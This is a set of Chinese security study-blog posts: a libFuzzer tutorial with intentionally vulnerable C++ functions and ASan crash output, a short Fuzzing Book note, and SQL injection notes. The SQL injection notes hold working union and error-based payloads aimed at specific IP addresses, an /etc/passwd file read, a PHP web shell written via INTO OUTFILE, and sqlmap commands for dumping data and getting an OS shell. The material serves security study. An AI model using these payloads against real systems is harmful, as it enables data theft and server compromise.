<figure class="highlight cc"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//DoSomethingInterestingWithMyAPI待测试函数</span></span><br><span class="line">  <span class="built_in">DoSomethingInterestingWithMyAPI</span>(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译目标</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -fsanitize=fuzzer,address mytarget.c</span><br></pre></td></tr></table></figure>

<p>最后需要链接libfuzzer.a</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -fsanitize-coverage=trace-pc-guard -fsanitize=address your_lib.cc fuzz_target.cc libFuzzer.a -o my_fuzzer</span><br></pre></td></tr></table></figure>

<p>运行fuzzer,当然也是可以使用相关语法对语料库进行操作，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#减小语料库的大小</span></span><br><span class="line"><span class="built_in">mkdir</span> NEW_CORPUS_DIR  <span class="comment"># Store minimized corpus here.</span></span><br><span class="line">./my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#interesting test 会被加入到语料库中</span></span><br><span class="line">./my_fuzzer -merge=1 CURRENT_CORPUS_DIR NEW_POTENTIALLY_INTERESTING_INPUTS_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始模糊测试，当然语料库也是可以为空的</span></span><br><span class="line">./my_fuzzer CORPUS_DIR </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="lesson-02"><a href="#lesson-02" class="headerlink" title="lesson 02"></a>lesson 02</h2><p>待测试的库vulnerable_functions.h：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vulnerable_functions.h</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">VulnerableFunction1</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="type">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">    result = data[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">1</span>] == <span class="string">&#x27;U&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">2</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">3</span>] == <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">typename</span> T::value_type <span class="title">DummyHash</span><span class="params">(<span class="type">const</span> T&amp; buffer)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">typename</span> T::value_type hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> value : buffer)</span><br><span class="line">    hash ^= value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line"><span class="keyword">constexpr</span> std::<span class="type">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">constexpr</span> std::<span class="type">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="built_in">sizeof</span>(kMagicHeader);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">VulnerableFunction2</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="type">bool</span> verify_hash)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="built_in">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">std::string <span class="title">header</span><span class="params">(<span class="keyword">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span></span>;</span><br><span class="line"></span><br><span class="line">  std::array&lt;<span class="type">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.<span class="built_in">c_str</span>()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  std::<span class="built_in">copy</span>(data, data + size, body.<span class="built_in">data</span>());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = <span class="built_in">DummyHash</span>(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> std::<span class="type">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">VulnerableFunction3</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, std::<span class="type">size_t</span> flags)</span> </span>&#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">VulnerableFunction2</span>(data, size, verify_hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span></span><br></pre></td></tr></table></figure>

<p>入口点代码</p>
<figure class="highlight cc"><table><tr><td class="code"><pre><span class="line"><span class="comment">//first_fuzzer.cc</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">VulnerableFunction1</span>(data, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译我们的入口点程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang++ -g -std=c++11 -fsanitize=fuzzer,address first_fuzzer.cc ../../libFuzzer/libFuzzer.a -o first_fuzzer</span><br><span class="line"></span><br><span class="line">clang++ -g -std=c++11 -fsanitize=fuzzer,address second_fuzzer.cc ../../libFuzzer/libFuzzer.a -o second_fuzzer</span><br><span class="line"></span><br><span class="line">clang++ -g -std=c++11 -fsanitize=fuzzer,address third_fuzzer.cc ../../libFuzzer/libFuzzer.a -o third_fuzzer</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后执行程序</span></span><br><span class="line">./first_fuzzer ./corpus1</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==2781==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000049473 at pc 0x000000550501 bp 0x7fff8d6b39c0 sp 0x7fff8d6b39b8</span><br><span class="line">READ of size 1 at 0x602000049473 thread T0</span><br><span class="line">    #0 0x550500 in VulnerableFunction1(unsigned char const*, unsigned long) /home/fourth/fuzz/libfuzzer-workshop-master/lessons/04/./vulnerable_functions.h:22:14</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x602000049473 is located 0 bytes to the right of 3-byte region [0x602000049470,0x602000049473)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/fourth/fuzz/libfuzzer-workshop-master/lessons/04/./vulnerable_functions.h:22:14 in VulnerableFunction1(unsigned char const*, unsigned long)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c0480001230: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  0x0c0480001240: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  0x0c0480001250: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd</span><br><span class="line">  0x0c0480001260: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  0x0c0480001270: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">=&gt;0x0c0480001280: fa fa fd fa fa fa fd fa fa fa fd fa fa fa[03]fa</span><br><span class="line">  0x0c0480001290: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c04800012d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==2781==ABORTING</span><br><span class="line">MS: 1 ChangeBinInt-; base unit: 9d447627131a2fa79c753457599a7adc3ef03146</span><br><span class="line">0x46,0x55,0x5a,</span><br><span class="line">FUZ</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br><span class="line">Base64: RlVa</span><br></pre></td></tr></table></figure>

<p>可以清楚的看到我们程序报错的具体函数位置 VulnerableFunction1(unsigned char const*, unsigned long)，也可以看到是内存溢出了，这与实际的情况是符合的。</p>
<p>复现crash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm">https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm</a></p>
<p><a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a></p>
<p><a href="https://www.anquanke.com/post/id/224823">https://www.anquanke.com/post/id/224823</a></p>
<p><a href="https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/">https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/</a></p>
]]></content>
      <categories>
        <category>Fuzzing</category>
        <category>libFuzzer</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>the fuzzing book study notes</title>
    <url>/2021/11/15/the-fuzzing-book-study-notes/</url>
    <content><![CDATA[<h1 id="The-Researcher-Tour"><a href="#The-Researcher-Tour" class="headerlink" title="The Researcher Tour"></a>The Researcher Tour</h1><p><a href="https://www.fuzzingbook.org/">https://www.fuzzingbook.org</a></p>
<p>Fuzzing: Breaking Things with Random Inputs</p>
<p><em>Create random inputs, and see if they break things.</em> Just let it run long enough and you’ll see.</p>
<span id="more"></span>

<h2 id="Mining-Function-Specifications"><a href="#Mining-Function-Specifications" class="headerlink" title="Mining Function Specifications"></a>Mining Function Specifications</h2><p>当我们测试一个程序的时候，不仅仅需要覆盖所有的行为，也还需要检查他的结果是否符合预期。</p>
<p><em>dynamic invariants</em>的作用：</p>
<ul>
<li>Dynamic invariants provide important information for symbolic fuzzing, such as types and ranges of function arguments.</li>
<li>Dynamic invariants provide pre- and postconditions for formal program proofs and verification.</li>
<li>Dynamic invariants provide a large number of assertions that can check whether function behavior has changed.</li>
<li>Checks provided by dynamic invariants can be very useful as oracles for checking the effects of generated tests</li>
</ul>
<h3 id="code-coverage"><a href="#code-coverage" class="headerlink" title="code coverage"></a>code coverage</h3>]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>xiaodiPenetration</title>
    <url>/2021/10/28/xiaodiPenetration/</url>
    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154745441.png" alt="image-20211004154745441"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简要明确参数类型</span><br><span class="line">	数字，字符，搜索，json等  -- 搜索  like &quot;%pike%&quot;</span><br><span class="line">简要明确请求方法：</span><br><span class="line">	get,post,cookie,request,http header</span><br><span class="line">	测试使用get还是post：将参数分别以两种形式提交，如果网页是显示的一样的，则网站是post方式传参</span><br><span class="line">注意灵活使用：&#x27;&#x27; &quot;&quot; ) # --+ -- 等</span><br><span class="line">	使用burpsuit进行注入的时候，空格需要换成 + </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154810562.png" alt="image-20211004154810562"></p>
<h2 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有数据库名（不存在） 表名，字段，数据</span><br><span class="line">直接使用猜，或者暴力破解</span><br></pre></td></tr></table></figure>

<h1 id="mysql注入："><a href="#mysql注入：" class="headerlink" title="mysql注入："></a>mysql注入：</h1><p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154839681.png" alt="image-20211004154839681"></p>
<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154903142.png" alt="image-20211004154903142"></p>
<h2 id="必要知识点："><a href="#必要知识点：" class="headerlink" title="必要知识点："></a>必要知识点：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在mysql5.0以上版本中，存在一个自带的数据库：</span><br><span class="line">	information_schema 一个存储了所有数据库名，表名，列名的数据库，相当于可以通过该数据库可以获得我们想要的信息</span><br><span class="line">数据中符号.代表下一级信息 x.y:x下的y</span><br><span class="line">	information_schema.tables:记录所有表名	-- table_schema数据库名称,table_name表名</span><br><span class="line">	information_schema.columns:记录所有列名		-- column_name列名, table_name表名</span><br><span class="line">	information_schema.schemata:记录所有数据库名 -- 字段schema_name 数据库名称</span><br><span class="line">	table_name:表名</span><br><span class="line">	column_name:列名</span><br><span class="line">	schema_name:数据库名</span><br><span class="line">limit猜解多个数据</span><br><span class="line">如何判断注入点：</span><br><span class="line">	and 1=1		页面返回正常</span><br><span class="line">	and 1=2		页面返回错误</span><br><span class="line">	可能存在注入点</span><br><span class="line">	或者：</span><br><span class="line">        http://xxx.com/xxx.php?id=2</span><br><span class="line">        http://xxx.com/xxx.php?id=3-1</span><br><span class="line">        http://xxx.com/xxx.php?id=3%2D1</span><br><span class="line">        上面三个返回的结果一样则表示存在SQL注入</span><br><span class="line"></span><br><span class="line">最好的经验去测试：</span><br><span class="line">	id=1	正常</span><br><span class="line">	id=1fajfa	错误</span><br><span class="line">	可能存在注入点</span><br></pre></td></tr></table></figure>

<ul>
<li><h2 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h2></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断字段个数:</span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=1 order by 5</span><br><span class="line">	order by 1</span><br><span class="line">	order by 2</span><br><span class="line">	order by 3</span><br><span class="line">	order by 4	以上正常</span><br><span class="line">	order by 5	开始错误</span><br><span class="line">	有5个字段</span><br><span class="line">报错猜测准备</span><br><span class="line">	.....?id=1 union select 1,2,3,4</span><br><span class="line">	.....?id=1shf union select 1,2,3,4</span><br><span class="line">	http://219.153.49.228:40047/new_list.php?id=-1 union select 1,2,3,4</span><br><span class="line">	-- 什么地方报错(显示出来的那个字段)就在那个字段进行相关的操作，比如在3这里报错了，就直接将3改成database()，.....?id=1shf select 1,2,database(),4</span><br><span class="line">信息收集：</span><br><span class="line">	数据库版本：version() 5.7.22-0ubuntu0.16.04.1</span><br><span class="line">	数据库名字：database()  mozhe_Discuz_StormGroup</span><br><span class="line">	数据库用户：user()  root@localhost</span><br><span class="line">	操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>

<h2 id="一般核心步骤"><a href="#一般核心步骤" class="headerlink" title="一般核心步骤"></a>一般核心步骤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,2,3,4	-- 在2,3,出显示信息</span><br><span class="line"></span><br><span class="line">查询特定数据库下的表，就是show tables</span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;	-- 得到表名 StormGroup_member</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27; -- StormGroup_member,notice</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;StormGroup_member&#x27; -- 得到数据中特定表的字段名 id,name,password,status</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php</span><br><span class="line">?id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</span><br><span class="line">-- </span><br><span class="line"></span><br><span class="line">获取所有的数据库名</span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154941058.png" alt="image-20211004154941058"></p>
<p>文件读取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load_file() 函数</span><br><span class="line">	UNION ALL SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)-- </span><br><span class="line"></span><br><span class="line">into outerfile	into dumpfile</span><br><span class="line">	UNION SELECT “&lt;? system($_REQUEST[&#x27;cmd&#x27;]);?&gt;” INTO OUTFILE “/var/www/html/victim.com/cmd.php”-- 将一句话木马写入到目标文件里面</span><br><span class="line"></span><br><span class="line">路径常见获取方法，遗留文件，漏洞报错，平台配置文件</span><br></pre></td></tr></table></figure>

<h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">google ： inurl .php?id= 寻找注入点</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&quot; --batch --dbms=mysql</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/mutillidae/index.php?page=user-info.php&amp;username=dg&amp;password=dgd&amp;user-info-php-submit-button=View+Account+Details&quot; --batch -p username  --dbs --users --current-user --current-db</span><br><span class="line"></span><br><span class="line">--batch 自动化完成</span><br><span class="line">-p username  --dbs --users --current-user --current-db</span><br><span class="line">(判断username是否是注入点，查询都有哪些数据库,所有用户，当前用户) </span><br><span class="line">-D wordpress --tables 指定库的所有表</span><br><span class="line">-D wordpress -T wp_users --columns 指定库的的一个表的所有字段</span><br><span class="line">--dump-all dump所有数据库的所有表</span><br><span class="line">-D wordpress -T wp_users --dump dump指定的表  (会解密加密数据，自动生成一个字典)</span><br><span class="line">-D wordpress -T wp_users -C &quot;username,password&quot; --dump dump指定的表</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; --batch</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --users</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --current-user</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --dbs</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --current-db</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security --tables </span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --columns </span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --dump</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --dump-all</span><br></pre></td></tr></table></figure>

<p>需要登录的注入点，要加上cookie，尽可能详细</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&quot; --batch --cookie=&quot;PHPSESSID:nu7gab2i5t0t8g1hbreapuhp11;security:low&quot;</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --dbms mysql -p id</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dyvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --sql-shell</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --os-shell</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --os-cmd=ls /</span><br></pre></td></tr></table></figure>

<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>无回显的情况：可能是因为SQL语句查询方式的问题导致，这个时候需要用到相关的报错或盲注进行后续操作，</p>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入报错用到的几个函数：</span><br><span class="line">	floor():向下取整 </span><br><span class="line">		公式：and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) -- mysql在遇到select id x, count(*) from tables group by x;这语句的时候会建立一个虚拟表(实际上就是会建立虚拟表),其中主键为x</span><br><span class="line">		floor(rand(0)*2) 一定会报错（三条以上的记录时）</span><br><span class="line">		floor(rand()*2) 不一定会报错</span><br><span class="line">	rand():在0和1之间产生一个随机数。</span><br><span class="line">	count():计数</span><br><span class="line">在使用这个函数的时候，可以直接根据公式来进行套用即可，把“你想获取数据的SQL语句”换为之前注入的一般语句即可。如下所示：</span><br><span class="line">例子：</span><br><span class="line">	http://222.18.158.243:4606/?</span><br><span class="line">	id=1 and(select 1 from (select count(*), concat(floor(rand(0)*2),0x23,0x23,(select count(*) from information_schema.columns where table_name=0x666c6167),0x23,0x23)temp from information_schema.tables group by temp )a)</span><br><span class="line">	数据库名、数据库用户名：</span><br><span class="line">	http://222.18.158.243:4606/?</span><br><span class="line">	id=1 and(select 1 from (select count(*), concat(floor(rand(0)*2),0x23,0x23,database(),0x23,0x23,user())temp from information_schema.tables group by temp )a)</span><br><span class="line">双注入：</span><br><span class="line">	公式：and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) -- mysql在遇到select id x, count(*) from tables group by x;这语句的时候会建立一个虚拟表(实际上就是会建立虚拟表),其中主键为x 其注入原理就是，建立虚拟表的时候，主键x冲突，产生报错</span><br><span class="line">	或者：and select count(*),concat(floor(rand(0)*2),0x23,一般的SQL注入语句) a from information_schema.tables group by a --ajd</span><br><span class="line">	&#x27; and select count(*),concat(floor(rand(0)*2),0x23,databse()) as a from information_schema.tables group by a --+</span><br><span class="line">	或者，使用 将and 改为union</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(schema_name) from information_schema.schemata))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;member&#x27;))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(id,username,pw,sex,phonenum,address,email) from pikachu.member))x from information_schema.tables group by x )a) --+</span><br></pre></td></tr></table></figure>

